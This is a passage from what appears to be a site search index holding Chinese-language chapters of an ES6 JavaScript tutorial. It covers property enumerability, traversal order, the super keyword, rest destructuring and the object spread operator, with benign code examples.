\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u6ca1\u6709\uff0c\u8fd4\u56de\u503c undefined\n//  {\n//    value: 123,\n//    writable: true,\n//    enumerable: true,\n//    configurable: true\n//  }\n</code></pre> <p>\u63cf\u8ff0\u5bf9\u8c61\u7684<code>enumerable</code>\u5c5e\u6027\uff0c\u79f0\u4e3a\u201c\u53ef\u679a\u4e3e\u6027\u201d\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u4e3a<code>false</code>\uff0c\u5c31\u8868\u793a\u67d0\u4e9b\u64cd\u4f5c\u4f1a\u5ffd\u7565\u5f53\u524d\u5c5e\u6027\u3002</p> <p>\u76ee\u524d\uff0c\u6709\u56db\u4e2a\u64cd\u4f5c\u4f1a\u5ffd\u7565<code>enumerable</code>\u4e3a<code>false</code>\u7684\u5c5e\u6027\u3002</p> <ul> <li><code>for...in</code>\u5faa\u73af\uff1a\u53ea\u904d\u5386\u5bf9\u8c61\u81ea\u8eab\u7684\u548c\u7ee7\u627f\u7684\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\u3002</li> <li><code>Object.keys()</code>\uff1a\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\u7684\u952e\u540d\u3002</li> <li><code>JSON.stringify()</code>\uff1a\u53ea\u4e32\u884c\u5316\u5bf9\u8c61\u81ea\u8eab\u7684\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\u3002</li> <li><code>Object.assign()</code>\uff1a \u5ffd\u7565<code>enumerable</code>\u4e3a<code>false</code>\u7684\u5c5e\u6027\uff0c\u53ea\u62f7\u8d1d\u5bf9\u8c61\u81ea\u8eab\u7684\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\u3002</li> </ul> <p>\u8fd9\u56db\u4e2a\u64cd\u4f5c\u4e4b\u4e2d\uff0c\u524d\u4e09\u4e2a\u662f ES5 \u5c31\u6709\u7684\uff0c\u6700\u540e\u4e00\u4e2a<code>Object.assign()</code>\u662f ES6 \u65b0\u589e\u7684\u3002\u5176\u4e2d\uff0c\u53ea\u6709<code>for...in</code>\u4f1a\u8fd4\u56de\u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u5176\u4ed6\u4e09\u4e2a\u65b9\u6cd5\u90fd\u4f1a\u5ffd\u7565\u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u53ea\u5904\u7406\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002\u5b9e\u9645\u4e0a\uff0c\u5f15\u5165\u201c\u53ef\u679a\u4e3e\u201d\uff08<code>enumerable</code>\uff09\u8fd9\u4e2a\u6982\u5ff5\u7684\u6700\u521d\u76ee\u7684\uff0c\u5c31\u662f\u8ba9\u67d0\u4e9b\u5c5e\u6027\u53ef\u4ee5\u89c4\u907f\u6389<code>for...in</code>\u64cd\u4f5c\uff0c\u4e0d\u7136\u6240\u6709\u5185\u90e8\u5c5e\u6027\u548c\u65b9\u6cd5\u90fd\u4f1a\u88ab\u904d\u5386\u5230\u3002\u6bd4\u5982\uff0c\u5bf9\u8c61\u539f\u578b\u7684<code>toString</code>\u65b9\u6cd5\uff0c\u4ee5\u53ca\u6570\u7ec4\u7684<code>length</code>\u5c5e\u6027\uff0c\u5c31\u901a\u8fc7\u201c\u53ef\u679a\u4e3e\u6027\u201d\uff0c\u4ece\u800c\u907f\u514d\u88ab<code>for...in</code>\u904d\u5386\u5230\u3002</p> <pre><code>Object.getOwnPropertyDescriptor(Object.prototype, 'toString').enumerable\n// false\n\nObject.getOwnPropertyDescriptor([], 'length').enumerable\n// false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>toString</code>\u548c<code>length</code>\u5c5e\u6027\u7684<code>enumerable</code>\u90fd\u662f<code>false</code>\uff0c\u56e0\u6b64<code>for...in</code>\u4e0d\u4f1a\u904d\u5386\u5230\u8fd9\u4e24\u4e2a\u7ee7\u627f\u81ea\u539f\u578b\u7684\u5c5e\u6027\u3002</p> <p>\u53e6\u5916\uff0cES6 \u89c4\u5b9a\uff0c\u6240\u6709 Class \u7684\u539f\u578b\u7684\u65b9\u6cd5\u90fd\u662f\u4e0d\u53ef\u679a\u4e3e\u7684\u3002</p> <pre><code>Object.getOwnPropertyDescriptor(class {foo() {}}.prototype, 'foo').enumerable\n// false\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\uff0c\u64cd\u4f5c\u4e2d\u5f15\u5165\u7ee7\u627f\u7684\u5c5e\u6027\u4f1a\u8ba9\u95ee\u9898\u590d\u6742\u5316\uff0c\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u53ea\u5173\u5fc3\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002\u6240\u4ee5\uff0c\u5c3d\u91cf\u4e0d\u8981\u7528<code>for...in</code>\u5faa\u73af\uff0c\u800c\u7528<code>Object.keys()</code>\u4ee3\u66ff\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_6","title":"\u5c5e\u6027\u7684\u904d\u5386","text":"<p>ES6 \u4e00\u5171\u6709 5 \u79cd\u65b9\u6cd5\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <p>\uff081\uff09for...in</p> <p><code>for...in</code>\u5faa\u73af\u904d\u5386\u5bf9\u8c61==\u81ea\u8eab\u7684\u548c\u7ee7\u627f\u7684==\u53ef\u679a\u4e3e\u5c5e\u6027\uff08\u4e0d\u542b Symbol \u5c5e\u6027\uff09\u3002</p> <p>\uff082\uff09Object.keys(obj)</p> <p><code>Object.keys</code>\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u62ec==\u5bf9\u8c61\u81ea\u8eab\u7684\uff08\u4e0d\u542b\u7ee7\u627f\u7684\uff09==\u6240\u6709\u53ef\u679a\u4e3e\u5c5e\u6027\uff08\u4e0d\u542b Symbol \u5c5e\u6027\uff09\u7684\u952e\u540d\u3002</p> <p>\uff083\uff09Object.getOwnPropertyNames(obj)</p> <p><code>Object.getOwnPropertyNames</code>\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5bf9\u8c61\u81ea\u8eab\u7684==\u6240\u6709\u5c5e\u6027==\uff08\u4e0d\u542b Symbol \u5c5e\u6027\uff0c\u4f46\u662f\u5305\u62ec\u4e0d\u53ef\u679a\u4e3e\u5c5e\u6027\uff09\u7684\u952e\u540d\u3002</p> <p>\uff084\uff09Object.getOwnPropertySymbols(obj)</p> <p><code>Object.getOwnPropertySymbols</code>\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709 Symbol \u5c5e\u6027\u7684\u952e\u540d\u3002</p> <p>\uff085\uff09Reflect.ownKeys(obj)</p> <p><code>Reflect.ownKeys</code>\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u952e\u540d\uff0c\u4e0d\u7ba1\u952e\u540d\u662f Symbol \u6216\u5b57\u7b26\u4e32\uff0c\u4e5f\u4e0d\u7ba1\u662f\u5426\u53ef\u679a\u4e3e\u3002</p> <p>\u4ee5\u4e0a\u7684 5 \u79cd\u65b9\u6cd5\u904d\u5386\u5bf9\u8c61\u7684\u952e\u540d\uff0c\u90fd\u9075\u5b88\u540c\u6837\u7684==\u5c5e\u6027\u904d\u5386\u7684\u6b21\u5e8f\u89c4\u5219==\u3002</p> <ul> <li>\u9996\u5148\u904d\u5386\u6240\u6709\u6570\u503c\u952e\uff0c\u6309\u7167\u6570\u503c\u5347\u5e8f\u6392\u5217\u3002</li> <li>\u5176\u6b21\u904d\u5386\u6240\u6709\u5b57\u7b26\u4e32\u952e\uff0c\u6309\u7167\u52a0\u5165\u65f6\u95f4\u5347\u5e8f\u6392\u5217\u3002</li> <li>\u6700\u540e\u904d\u5386\u6240\u6709 Symbol \u952e\uff0c\u6309\u7167\u52a0\u5165\u65f6\u95f4\u5347\u5e8f\u6392\u5217\u3002</li> </ul> <pre><code>Reflect.ownKeys({ [Symbol()]:0, b:0, 10:0, 2:0, a:0 })\n// ['2', '10', 'b', 'a', Symbol()]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Reflect.ownKeys</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u4e86\u53c2\u6570\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u3002\u8fd9\u4e2a\u6570\u7ec4\u7684\u5c5e\u6027\u6b21\u5e8f\u662f\u8fd9\u6837\u7684\uff0c\u9996\u5148\u662f\u6570\u503c\u5c5e\u6027<code>2</code>\u548c<code>10</code>\uff0c\u5176\u6b21\u662f\u5b57\u7b26\u4e32\u5c5e\u6027<code>b</code>\u548c<code>a</code>\uff0c\u6700\u540e\u662f Symbol \u5c5e\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#super","title":"super \u5173\u952e\u5b57","text":"<p>\u6211\u4eec\u77e5\u9053\uff0c<code>this</code>\u5173\u952e\u5b57\u603b\u662f\u6307\u5411\u51fd\u6570\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\uff0cES6 \u53c8\u65b0\u589e\u4e86\u53e6\u4e00\u4e2a\u7c7b\u4f3c\u7684==\u5173\u952e\u5b57<code>super</code>\uff0c\u6307\u5411\u5f53\u524d\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61==\u3002</p> <pre><code>const proto = {\n  foo: 'hello'\n};\n\nconst obj = {\n  foo: 'world',\n  find() {\n    return super.foo;\n  }\n};\n\nObject.setPrototypeOf(obj, proto);\nobj.find() // \"hello\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61<code>obj.find()</code>\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u901a\u8fc7<code>super.foo</code>\u5f15\u7528\u4e86\u539f\u578b\u5bf9\u8c61<code>proto</code>\u7684<code>foo</code>\u5c5e\u6027\u3002</p> <p>\u6ce8\u610f\uff0c<code>super</code>\u5173\u952e\u5b57\u8868\u793a\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u53ea\u80fd\u7528\u5728\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u7528\u5728\u5176\u4ed6\u5730\u65b9\u90fd\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nconst obj = {\n  foo: super.foo\n}\n\n// \u62a5\u9519\nconst obj = {\n  foo: () =&gt; super.foo\n}\n\n// \u62a5\u9519\nconst obj = {\n  foo: function () {\n    return super.foo\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4e09\u79cd<code>super</code>\u7684\u7528\u6cd5\u90fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5bf9\u4e8e JavaScript \u5f15\u64ce\u6765\u8bf4\uff0c\u8fd9\u91cc\u7684<code>super</code>\u90fd\u6ca1\u6709\u7528\u5728\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e4b\u4e2d\u3002\u7b2c\u4e00\u79cd\u5199\u6cd5\u662f<code>super</code>\u7528\u5728\u5c5e\u6027\u91cc\u9762\uff0c\u7b2c\u4e8c\u79cd\u548c\u7b2c\u4e09\u79cd\u5199\u6cd5\u662f<code>super</code>\u7528\u5728\u4e00\u4e2a\u51fd\u6570\u91cc\u9762\uff0c\u7136\u540e\u8d4b\u503c\u7ed9<code>foo</code>\u5c5e\u6027\u3002\u76ee\u524d\uff0c\u53ea\u6709\u5bf9\u8c61\u65b9\u6cd5\u7684\u7b80\u5199\u6cd5\u53ef\u4ee5\u8ba9 JavaScript \u5f15\u64ce\u786e\u8ba4\uff0c\u5b9a\u4e49\u7684\u662f\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002</p> <p>JavaScript \u5f15\u64ce\u5185\u90e8\uff0c<code>super.foo</code>\u7b49\u540c\u4e8e<code>Object.getPrototypeOf(this).foo</code>\uff08\u5c5e\u6027\uff09\u6216<code>Object.getPrototypeOf(this).foo.call(this)</code>\uff08\u65b9\u6cd5\uff09\u3002</p> <pre><code>const proto = {\n  x: 'hello',\n  foo() {\n    console.log(this.x);\n  },\n};\n\nconst obj = {\n  x: 'world',\n  foo() {\n    super.foo();\n  }\n}\n\nObject.setPrototypeOf(obj, proto);\n\nobj.foo() // \"world\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>super.foo</code>\u6307\u5411\u539f\u578b\u5bf9\u8c61<code>proto</code>\u7684<code>foo</code>\u65b9\u6cd5\uff0c\u4f46\u662f\u7ed1\u5b9a\u7684<code>this</code>\u5374\u8fd8\u662f\u5f53\u524d\u5bf9\u8c61<code>obj</code>\uff0c\u56e0\u6b64\u8f93\u51fa\u7684\u5c31\u662f<code>world</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_7","title":"\u6269\u5c55\u8fd0\u7b97\u7b26...","text":"<p>ES2018 \u5f15\u5165\u8fd9\u4e2a\u6269\u5c55\u8fd0\u7b97\u7b26</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_8","title":"\u89e3\u6784\u8d4b\u503c","text":"<p>\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\u7528\u4e8e\u4ece\u4e00\u4e2a\u5bf9\u8c61\u53d6\u503c\uff0c\u76f8\u5f53\u4e8e\u5c06\u76ee\u6807\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u53ef\u904d\u5386\u7684\uff08enumerable\uff09\u3001\u4f46\u5c1a\u672a\u88ab\u8bfb\u53d6\u7684\u5c5e\u6027\uff0c\u5206\u914d\u5230\u6307\u5b9a\u7684\u5bf9\u8c61\u4e0a\u9762\u3002\u6240\u6709\u7684\u952e\u548c\u5b83\u4eec\u7684\u503c\uff0c\u90fd\u4f1a\u62f7\u8d1d\u5230\u65b0\u5bf9\u8c61\u4e0a\u9762\u3002</p> <pre><code>let { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\nx // 1\ny // 2\nz // { a: 3, b: 4 }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>z</code>\u662f\u89e3\u6784\u8d4b\u503c\u6240\u5728\u7684\u5bf9\u8c61\u3002\u5b83\u83b7\u53d6\u7b49\u53f7\u53f3\u8fb9\u7684\u6240\u6709\u5c1a\u672a\u8bfb\u53d6\u7684\u952e\uff08<code>a</code>\u548c<code>b</code>\uff09\uff0c\u5c06\u5b83\u4eec\u8fde\u540c\u503c\u4e00\u8d77\u62f7\u8d1d\u8fc7\u6765\u3002</p> <p>\u7531\u4e8e\u89e3\u6784\u8d4b\u503c\u8981\u6c42\u7b49\u53f7\u53f3\u8fb9\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5982\u679c\u7b49\u53f7\u53f3\u8fb9\u662f<code>undefined</code>\u6216<code>null</code>\uff0c\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b83\u4eec\u65e0\u6cd5\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>let { ...z } = null; // \u8fd0\u884c\u65f6\u9519\u8bef\nlet { ...z } = undefined; // \u8fd0\u884c\u65f6\u9519\u8bef\n</code></pre> <p>\u89e3\u6784\u8d4b\u503c\u5fc5\u987b\u662f\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>let { ...x, y, z } = someObject; // \u53e5\u6cd5\u9519\u8bef\nlet { x, ...y, ...z } = someObject; // \u53e5\u6cd5\u9519\u8bef\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u89e3\u6784\u8d4b\u503c\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u4f1a\u62a5\u9519\u3002</p> <p>\u6ce8\u610f\uff0c\u89e3\u6784\u8d4b\u503c\u7684\u62f7\u8d1d\u662f\u6d45\u62f7\u8d1d\uff0c\u5373\u5982\u679c\u4e00\u4e2a\u952e\u7684\u503c\u662f\u590d\u5408\u7c7b\u578b\u7684\u503c\uff08\u6570\u7ec4\u3001\u5bf9\u8c61\u3001\u51fd\u6570\uff09\u3001\u90a3\u4e48\u89e3\u6784\u8d4b\u503c\u62f7\u8d1d\u7684\u662f\u8fd9\u4e2a\u503c\u7684\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u8fd9\u4e2a\u503c\u7684\u526f\u672c\u3002</p> <pre><code>let obj = { a: { b: 1 } };\nlet { ...x } = obj;\nobj.a.b = 2;\nx.a.b // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>x</code>\u662f\u89e3\u6784\u8d4b\u503c\u6240\u5728\u7684\u5bf9\u8c61\uff0c\u62f7\u8d1d\u4e86\u5bf9\u8c61<code>obj</code>\u7684<code>a</code>\u5c5e\u6027\u3002<code>a</code>\u5c5e\u6027\u5f15\u7528\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4fee\u6539\u8fd9\u4e2a\u5bf9\u8c61\u7684\u503c\uff0c\u4f1a\u5f71\u54cd\u5230\u89e3\u6784\u8d4b\u503c\u5bf9\u5b83\u7684\u5f15\u7528\u3002</p> <p>\u53e6\u5916\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u7684\u89e3\u6784\u8d4b\u503c\uff0c\u4e0d\u80fd\u590d\u5236\u7ee7\u627f\u81ea\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <pre><code>let o1 = { a: 1 };\nlet o2 = { b: 2 };\no2.__proto__ = o1;\nlet { ...o3 } = o2;\no3 // { b: 2 }\no3.a // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61<code>o3</code>\u590d\u5236\u4e86<code>o2</code>\uff0c\u4f46\u662f\u53ea\u590d\u5236\u4e86<code>o2</code>\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u6ca1\u6709\u590d\u5236\u5b83\u7684\u539f\u578b\u5bf9\u8c61<code>o1</code>\u7684\u5c5e\u6027\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const o = Object.create({ x: 1, y: 2 });\no.z = 3;\n\nlet { x, ...newObj } = o;\nlet { y, z } = newObj;\nx // 1\ny // undefined\nz // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>x</code>\u662f\u5355\u7eaf\u7684\u89e3\u6784\u8d4b\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u8bfb\u53d6\u5bf9\u8c61<code>o</code>\u7ee7\u627f\u7684\u5c5e\u6027\uff1b\u53d8\u91cf<code>y</code>\u548c<code>z</code>\u662f\u6269\u5c55\u8fd0\u7b97\u7b26\u7684\u89e3\u6784\u8d4b\u503c\uff0c\u53ea\u80fd\u8bfb\u53d6\u5bf9\u8c61<code>o</code>\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u53d8\u91cf<code>z</code>\u53ef\u4ee5\u8d4b\u503c\u6210\u529f\uff0c\u53d8\u91cf<code>y</code>\u53d6\u4e0d\u5230\u503c\u3002ES6 \u89c4\u5b9a\uff0c\u53d8\u91cf\u58f0\u660e\u8bed\u53e5\u4e4b\u4e2d\uff0c\u5982\u679c\u4f7f\u7528\u89e3\u6784\u8d4b\u503c\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u5fc5\u987b\u662f\u4e00\u4e2a\u53d8\u91cf\u540d\uff0c\u800c\u4e0d\u80fd\u662f\u4e00\u4e2a\u89e3\u6784\u8d4b\u503c\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u4e0a\u9762\u4ee3\u7801\u5f15\u5165\u4e86\u4e2d\u95f4\u53d8\u91cf<code>newObj</code>\uff0c\u5982\u679c\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u4f1a\u62a5\u9519\u3002</p> <pre><code>let { x, ...{ y, z } } = o;\n// SyntaxError: ... must be followed by an identifier in declaration contexts\n</code></pre> <p>\u89e3\u6784\u8d4b\u503c\u7684\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u6269\u5c55\u67d0\u4e2a\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5f15\u5165\u5176\u4ed6\u64cd\u4f5c\u3002</p> <pre><code>function baseFunction({ a, b }) {\n  // ...\n}\nfunction wrapperFunction({ x, y, ...restConfig }) {\n  // \u4f7f\u7528 x \u548c y \u53c2\u6570\u8fdb\u884c\u64cd\u4f5c\n  // \u5176\u4f59\u53c2\u6570\u4f20\u7ed9\u539f\u59cb\u51fd\u6570\n  return baseFunction(restConfig);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u59cb\u51fd\u6570<code>baseFunction</code>\u63a5\u53d7<code>a</code>\u548c<code>b</code>\u4f5c\u4e3a\u53c2\u6570\uff0c\u51fd\u6570<code>wrapperFunction</code>\u5728<code>baseFunction</code>\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u4e86\u6269\u5c55\uff0c\u80fd\u591f\u63a5\u53d7\u591a\u4f59\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u4fdd\u7559\u539f\u59cb\u51fd\u6570\u7684\u884c\u4e3a\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_9","title":"\u6269\u5c55\u8fd0\u7b97\u7b26","text":"<p>\u5bf9\u8c61\u7684\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u7528\u4e8e\u53d6\u51fa\u53c2\u6570\u5bf9\u8c61\u7684\u6240\u6709\u53ef\u904d\u5386\u5c5e\u6027\uff0c\u62f7\u8d1d\u5230\u5f53\u524d\u5bf9\u8c61\u4e4b\u4e2d\u3002</p> <pre><code>let z = { a: 3, b: 4 };\nlet n = { ...z };\nn // { a: 3, b: 4 }\n</code></pre> <p>\u7531\u4e8e\u6570\u7ec4\u662f\u7279\u6b8a\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u5bf9\u8c61\u7684\u6269\u5c55\u8fd0\u7b97\u7b26\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6570\u7ec4\u3002</p> <pre><code>let foo = { ...['a', 'b', 'c'] };\nfoo\n// {0: \"a\", 1: \"b\", 2: \"c\"}\n</code></pre> <p>\u5982\u679c\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u662f\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u5219\u6ca1\u6709\u4efb\u4f55\u6548\u679c\u3002</p> <pre><code>{...{}, a: 1}\n// { a: 1 }\n</code></pre> <p>\u5982\u679c\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u4e0d\u662f\u5bf9\u8c61\uff0c\u5219\u4f1a\u81ea\u52a8\u5c06\u5176\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>// \u7b49\u540c\u4e8e {...Object(1)}\n{...1} // {}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u662f\u6574\u6570<code>1</code>\uff0c\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u6570\u503c\u7684\u5305\u88c5\u5bf9\u8c61<code>Number{1}</code>\u3002\u7531\u4e8e\u8be5\u5bf9\u8c61\u6ca1\u6709\u81ea\u8eab\u5c5e\u6027\uff0c\u6240\u4ee5\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u90fd\u662f\u7c7b\u4f3c\u7684\u9053\u7406\u3002</p> <pre><code>// \u7b49\u540c\u4e8e {...Object(true)}\n{...true} // {}\n\n// \u7b49\u540c\u4e8e {...Object(undefined)}\n{...undefined} // {}\n\n// \u7b49\u540c\u4e8e {...Object(null)}\n{...null} // {}\n</code></pre> <p>\u4f46\u662f\uff0c\u5982\u679c\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u662f\u5b57\u7b26\u4e32\uff0c\u5b83\u4f1a\u81ea\u52a8\u8f6c\u6210\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u56e0\u6b64\u8fd4\u56de\u7684\u4e0d\u662f\u7a7a\u5bf9\u8c61\u3002</p> <pre><code>{...'hello'}\n// {0: \"h\", 1: \"e\", 2: \"l\", 3: \"l\", 4: \"o\"}\n</code></pre> <p>\u5bf9\u8c61\u7684\u6269\u5c55\u8fd0\u7b97\u7b26\u7b49\u540c\u4e8e\u4f7f\u7528<code>Object.assign()</code>\u65b9\u6cd5\u3002</p> <pre><code>let aClone = { ...a };\n// \u7b49\u540c\u4e8e\nlet aClone = Object.assign({}, a);\n</code></pre> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u662f==\u62f7\u8d1d\u4e86\u5bf9\u8c61\u5b9e\u4f8b\u7684\u5c5e\u6027==\uff0c\u5982\u679c\u60f3\u5b8c\u6574\u514b\u9686\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd8\u62f7\u8d1d\u5bf9\u8c61\u539f\u578b\u7684\u5c5e\u6027\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>// \u5199\u6cd5\u4e00\nconst clone1 = {\n  __proto__: Object.getPrototypeOf(obj),\n  ...obj\n};\n\n// \u5199\u6cd5\u4e8c\nconst clone2 = Object.assign(\n  Object.create(Object.getPrototypeOf(obj)),\n  obj\n);\n\n// \u5199\u6cd5\u4e09\nconst clone3 = Object.create(\n  Object.getPrototypeOf(obj),\n  Object.getOwnPropertyDescriptors(obj)\n)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u6cd5\u4e00\u7684<code>__proto__</code>\u5c5e\u6027\u5728\u975e\u6d4f\u89c8\u5668\u7684\u73af\u5883\u4e0d\u4e00\u5b9a\u90e8\u7f72\uff0c\u56e0\u6b64\u63a8\u8350\u4f7f\u7528\u5199\u6cd5\u4e8c\u548c\u5199\u6cd5\u4e09\u3002</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u53ef\u4ee5\u7528\u4e8e\u5408\u5e76\u4e24\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>let ab = { ...a, ...b };\n// \u7b49\u540c\u4e8e\nlet ab = Object.assign({}, a, b);\n</code></pre> <p>\u5982\u679c\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5c5e\u6027\uff0c\u653e\u5728\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\uff0c\u5219\u6269\u5c55\u8fd0\u7b97\u7b26\u5185\u90e8\u7684\u540c\u540d\u5c5e\u6027\u4f1a\u88ab\u8986\u76d6\u6389\u3002</p> <pre><code>let aWithOverrides = { ...a, x: 1, y: 2 };\n// \u7b49\u540c\u4e8e\nlet aWithOverrides = { ...a, ...{ x: 1, y: 2 } };\n// \u7b49\u540c\u4e8e\nlet x = 1, y = 2, aWithOverrides = { ...a, x, y };\n// \u7b49\u540c\u4e8e\nlet aWithOverrides = Object.assign({}, a, { x: 1, y: 2 });\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a</code>\u5bf9\u8c61\u7684<code>x</code>\u5c5e\u6027\u548c<code>y</code>\u5c5e\u6027\uff0c\u62f7\u8d1d\u5230\u65b0\u5bf9\u8c61\u540e\u4f1a\u88ab\u8986\u76d6\u6389\u3002</p> <p>\u8fd9\u7528\u6765\u4fee\u6539\u73b0\u6709\u5bf9\u8c61\u90e8\u5206\u7684\u5c5e\u6027\u5c31\u5f88\u65b9\u4fbf\u4e86\u3002</p> <pre><code>let newVersion = {\n  ...previousVersion,\n  name: 'New Name' // Override the name property\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>newVersion</code>\u5bf9\u8c61\u81ea\u5b9a\u4e49\u4e86<code>name</code>\u5c5e\u6027\uff0c\u5176\u4ed6\u5c5e\u6027\u5168\u90e8\u590d\u5236\u81ea<code>previousVersion</code>\u5bf9\u8c61\u3002</p> <p>\u5982\u679c\u628a\u81ea\u5b9a\u4e49\u5c5e\u6027\u653e\u5728\u6269\u5c55\u8fd0\u7b97\u7b26\u524d\u9762\uff0c\u5c31\u53d8\u6210\u4e86\u8bbe\u7f6e\u65b0\u5bf9\u8c61\u7684\u9ed8\u8ba4\u5c5e\u6027\u503c\u3002</p> <pre><code>let aWithDefaults = { x: 1, y: 2, ...a };\n// \u7b49\u540c\u4e8e\nlet aWithDefaults = 